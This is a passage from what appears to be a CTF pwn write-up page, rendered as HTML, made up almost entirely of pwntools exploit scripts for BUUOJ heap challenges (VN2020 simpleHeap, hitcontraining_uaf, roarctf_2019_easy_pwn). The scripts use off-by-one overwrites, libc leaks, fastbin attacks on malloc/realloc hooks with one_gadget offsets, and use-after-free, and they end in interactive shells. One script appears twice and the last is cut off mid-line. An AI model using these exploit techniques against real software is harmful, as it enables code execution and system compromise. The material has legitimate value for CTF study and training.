class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25215</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b free&quot;)</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#idx1</span></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>))<span class="comment">#溢出修改chunk2的size为0x91</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">4</span>) <span class="comment">#idx3</span></span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0</span>))<span class="comment">#idx4</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)  <span class="comment">#idx5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#idx6</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0x21</span>))<span class="comment">#idx7</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#idx8</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#idx9</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x18</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#idx6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)  <span class="comment">#将其释放到unsorted bin里，就可以泄漏unsorted bin的地址</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x20</span>) <span class="comment">#idx1</span></span><br><span class="line"><span class="built_in">pow</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">38</span>)[<span class="number">32</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_daget_offset=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_daget=libc_base+one_daget_offset[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)       <span class="comment">#fast bin chunk7&gt;chunk8 </span></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(libc_base+<span class="number">0x3c4aed</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#get idx7</span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">payload += p64(one_daget) <span class="comment">#realloc_hook 写入one daget</span></span><br><span class="line">payload+= p64(libc_base+<span class="number">0x846C0</span>+<span class="number">0xc</span>)<span class="comment">#malloc hook 写入</span></span><br><span class="line">add(<span class="number">0x60</span>,payload)<span class="comment">#get   idx8  malloc_hook chunk</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-44-VN2020公开赛-simpleHeap-solve"><a href="#NO-44-VN2020公开赛-simpleHeap-solve" class="headerlink" title="NO.44 VN2020公开赛_simpleHeap_solve"></a>NO.44 VN2020公开赛_simpleHeap_solve</h1><h3 id="exp-44"><a href="#exp-44" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25215</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b free&quot;)</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x30</span>) <span class="comment">#idx1</span></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>))<span class="comment">#溢出修改chunk2的size为0x91</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">4</span>) <span class="comment">#idx3</span></span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0</span>))<span class="comment">#idx4</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)  <span class="comment">#idx5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#idx6</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0x21</span>))<span class="comment">#idx7</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#idx8</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#idx9</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x18</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#idx6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)  <span class="comment">#将其释放到unsorted bin里，就可以泄漏unsorted bin的地址</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x20</span>) <span class="comment">#idx1</span></span><br><span class="line"><span class="built_in">pow</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">38</span>)[<span class="number">32</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_daget_offset=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_daget=libc_base+one_daget_offset[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)       <span class="comment">#fast bin chunk7&gt;chunk8 </span></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(libc_base+<span class="number">0x3c4aed</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#get idx7</span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">payload += p64(one_daget) <span class="comment">#realloc_hook 写入one daget</span></span><br><span class="line">payload+= p64(libc_base+<span class="number">0x846C0</span>+<span class="number">0xc</span>)<span class="comment">#malloc hook 写入</span></span><br><span class="line">add(<span class="number">0x60</span>,payload)<span class="comment">#get   idx8  malloc_hook chunk</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-45-hitcontraining-uaf-solve"><a href="#NO-45-hitcontraining-uaf-solve" class="headerlink" title="NO.45 hitcontraining_uaf_solve"></a>NO.45 hitcontraining_uaf_solve</h1><h3 id="exp-45"><a href="#exp-45" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./hitcontraining_uaf&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28737</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;hitcontraining_uaf&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Note size :&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Content :&#x27;</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span>(<span class="params">index</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x08048945</span></span><br><span class="line">payload = p32(binsh)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;aaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;vvvvvvvvvvvvvvvvvvv&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,payload)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-46-roarctf-2019-easy-pwn-solve"><a href="#NO-46-roarctf-2019-easy-pwn-solve" class="headerlink" title="NO.46 roarctf_2019_easy_pwn_solve"></a>NO.46 roarctf_2019_easy_pwn_solve</h1><h3 id="exp-46"><a href="#exp-46" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27494</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;roarctf_2019_easy_pwn&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/libc/ubuntu16/64/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;size: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">sleep(<span class="number">0.6</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;size: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="comment">#return p.recvuntil(&#x27;Note&#x27;)[:-4]</span></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,<span class="number">0x58</span>+<span class="number">0xa</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+p8(<span class="number">0xe1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arean = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">libc_base = main_arean - <span class="number">0x3c4b20</span></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">realloc = libc_base + <span class="number">0x846c0</span></span><br><span class="line">fake_chunk = main_arean - <span class="number">0x33</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">4</span>,<span class="number">0x8</span>,p64(fake_chunk))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span 